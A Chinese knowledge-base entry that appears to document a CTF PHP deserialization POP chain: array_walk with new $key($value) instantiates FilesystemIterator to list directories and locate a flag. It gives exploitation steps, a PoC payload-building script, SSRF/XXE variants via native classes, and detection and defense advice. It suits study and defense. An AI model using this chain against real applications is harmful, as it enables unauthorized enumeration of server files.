---
id: web-php-deserialization-native-class-array-walk-directory-read
title: PHP 原生类目录读取 POP 链：array_walk 以属性名为类名任意实例化 FilesystemIterator 遍历找 flag
type: scenario
domain: web
path: web/php/deserialization
technique: php-native-class-array-walk-directory-read
tags:
- php
- deserialization
- pop-chain
- magic-method
- native-class
- filesystemiterator
- directory-traversal
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V176
  verified_at: '2026-11-06T17:11:15+08:00'
  notes: 已对照原文核对：Sakura __destruct→__toString→HeracIqs __invoke→E __get→array_walk new $key($value) 链、FilesystemIterator '/' 实例化、md5(md5('esW'))==123 门槛及根目录 flag 文件名截图均一致；PoC 未复跑
url: /docs/web/php/deserialization/web-php-deserialization-native-class-array-walk-directory-read/
draft: false
kb_aliases:
- PHP 原生类文件读取
- FilesystemIterator 读目录
- DirectoryIterator 遍历
- GlobIterator 找 flag
- array_walk 任意实例化
- new $class($arg) gadget
- 原生类 POP 链
- ezzz_unserialize
---

## 一句话结论

当 POP 链中存在 `new $class($arg)` 形式的任意类实例化（类名来自数组键、参数来自值，例如 `array_walk($this, function($v,$k){ new $k($v); })`），攻击者可以把对象属性名设为 `FilesystemIterator`、属性值设为 `/`，在 `__get`/`__invoke` 等魔术方法触发时实例化 PHP 内置目录迭代器并遍历目录，直接列出根目录/目标目录下的 flag 文件名，再配合 `glob://` 与通配符定位文件。

## 原理

- **PHP 原生类可作为 POP gadget**：`FilesystemIterator`、`DirectoryIterator`、`GlobIterator` 都是内置的目录迭代器，构造时接收一个路径；`foreach` 它们会逐个返回目录项（`SplFileInfo`/路径字符串）。它们本身不能被直接反序列化，但可以在反序列化后的对象图里被 `new` 出来。
- **任意类实例化的来源**：某些 POP 链中使用了 `array_walk($this, function($value, $key) { $obj = new $key($value); ... })`。`array_walk` 遍历对象的 public 属性时，`$key` 是属性名、`$value` 是属性值；如果代码直接把 `$key` 当类名、`$value` 当构造参数，攻击者就能通过反序列化属性名/属性值实例化任意类。
- **触发流程（原文链）**：
  1. `Sakura::__destruct()` 执行 `echo $this->apple`；`apple` 设为另一个 `Sakura` 对象，触发其 `__toString()`。
  2. `Sakura::__toString()` 取 `$this->strawberry` 并执行 `$new()`；`strawberry` 设为 `HeracIqs` 对象，触发 `__invoke()`。
  3. `HeracIqs::__invoke()` 先做 `md5(md5($this->blueberry)) == 123` 的弱比较（`blueberry='esW'` 满足），再访问 `$this->grape->hey`；`grape` 设为 `E` 对象，`hey` 是不存在属性，触发 `E::__get()`。
  4. `E::__get()` 对 `$this` 做 `array_walk`，回调里 `new $key($value)`；攻击者给 E 对象加一个 public 属性 `FilesystemIterator => '/'`，于是实例化 `new FilesystemIterator('/')` 并 `foreach` 输出根目录项。
- **为什么能读到 flag**：目录遍历会输出根目录/目标目录下的文件名；若 flag 文件名被随机化或藏在深层目录，可把路径换成 `/`、`/var/www/html` 等，或用 `GlobIterator` 配合 `glob:///*flag*`、`glob:///*/*flag*` 搜索。原文用 `/` 直接列出了 `flag` 文件。
- **边界**：该链依赖目标代码里恰好存在 `new $key($value)` 这种危险任意实例化；若没有该 gadget，单纯反序列化原生类不会自动执行。`FilesystemIterator` 等类不能被 `unserialize` 直接构造，必须通过链中的 `new`。

## 触发条件

- 存在用户可控 `unserialize()`，且对象图中有可触发的 `__destruct`/`__toString`/`__invoke`/`__get` 链。
- 链中某处存在 `new $可控类名($可控参数)`（常见于 `array_walk` 回调、`call_user_func`、变量类名实例化）。
- 目标 PHP 未禁用 `FilesystemIterator`/`DirectoryIterator`/`GlobIterator`，且进程对目标目录有读权限。
- 目标的 flag 文件位于可遍历目录中，或可通过 `glob://` 通配符定位。

## 利用步骤

1. 阅读源码，找出所有 `new $var(...)`、`array_walk`、`call_user_func` 等可控制类名/参数的 sink，以及可触发的魔术方法链。
2. 构造对象图：按链的触发顺序连接 `__destruct → __toString → __invoke → __get`。
3. 在承载 `array_walk` 的对象上添加 public 属性：属性名设为 `FilesystemIterator`（或 `DirectoryIterator`/`GlobIterator`），属性值设为要遍历的路径（如 `/`、`/var/www/html`）。
4. 序列化对象图并提交；触发后 `array_walk` 会实例化目录迭代器并输出目录项。
5. 从输出中找 flag 文件名；若目录太深，改用 `GlobIterator` + `glob:///*flag*` 或逐层遍历。
6. 读取 flag 文件内容（若链只能列目录，可再找文件读取 sink 或结合 `glob://` + `include`）。

## PoC

```php
<?php
error_reporting(0);
class Sakura {
    public $apple;
    public $strawberry;
    public function __construct($a){ $this->apple = $a; }
    public function __destruct(){ echo $this->apple; }
    public function __toString(){ $new = $this->strawberry; return $new(); }
}
class E {
    public $e;
    public function __get($arg1){
        array_walk($this, function($Monday, $Tuesday) {
            $Wednesday = new $Tuesday($Monday);      // 任意类实例化
            foreach ($Wednesday as $Thursday) {
                echo $Thursday . '<br>';
            }
        });
    }
}
class HeracIqs {
    public $grape;
    public $blueberry;
    public function __invoke(){
        if (md5(md5($this->blueberry)) == 123) {     // 弱比较门槛
            return $this->grape->hey;                // 触发 E::__get
        }
    }
}

$S  = new Sakura();
$S1 = new Sakura();
$S->apple = $S1;                 // __destruct echo -> Sakura::__toString
$H = new HeracIqs();
$H->blueberry = 'esW';
$S1->strawberry = $H;            // __toString -> $H() -> __invoke
$e = new E();
$H->grape = $e;                  // __invoke -> $e->hey -> __get
$e->FilesystemIterator = '/';    // array_walk: new FilesystemIterator('/')
echo serialize($S);
?>
```

说明：原文在 [GHCTF 2024 新生赛] ezzz_unserialize 中实测列出根目录并发现 flag 文件名；`md5(md5('esW')) == 123` 的具体取值依赖 PHP 弱比较，迁移时需按目标验证。本库未复跑。

## 变体与关联

- 变体：把 `FilesystemIterator` 换成 `DirectoryIterator`、`GlobIterator`；用 `glob:///*flag*`、`glob:///var/www/html/*` 搜索文件名。
- 变体：`new $class($arg)` 也可实例化 `SoapClient`、`SimpleXMLElement` 等具备网络/解析能力的原生类，形成 SSRF/XXE。
- 变体：若 `array_walk` 的键不是类名而是固定值，可寻找其他 `call_user_func`/变量函数/变量类名 sink。
- 关联：[[web-php-deserialization-c-prefix-arrayobject-bypass]]（原生类 ArrayObject 绕过反序列化黑名单）、[[web-php-deserialization-wakeup-pregmatch-tostring-get-invoke-read]]（`__toString/__get/__invoke` 链）、[[web-php-rce-variable-class-function-call-reflection]]（变量类名/函数调用）。

## 检测与防御

- 禁止 `unserialize` 不可信数据；必须使用时用 `allowed_classes` 白名单，禁止内置类进入对象图。
- 代码审计：禁止 `new $userControlledClass(...)`、`array_walk` 回调里用键当类名、`call_user_func($userInput, ...)`；对类名/函数名做固定白名单。
- 限制目录遍历：Web 进程最小权限，flag/敏感文件放在不可读目录；禁用不必要的 `FilesystemIterator`/`DirectoryIterator`/`GlobIterator`。
- 检测：请求中出现 `O:` 序列化结构且包含 `FilesystemIterator`/`DirectoryIterator`/`GlobIterator` 字符串；监控目录遍历类实例化、异常 `glob://` 访问、Web 进程对根目录/敏感目录的 `readdir`。
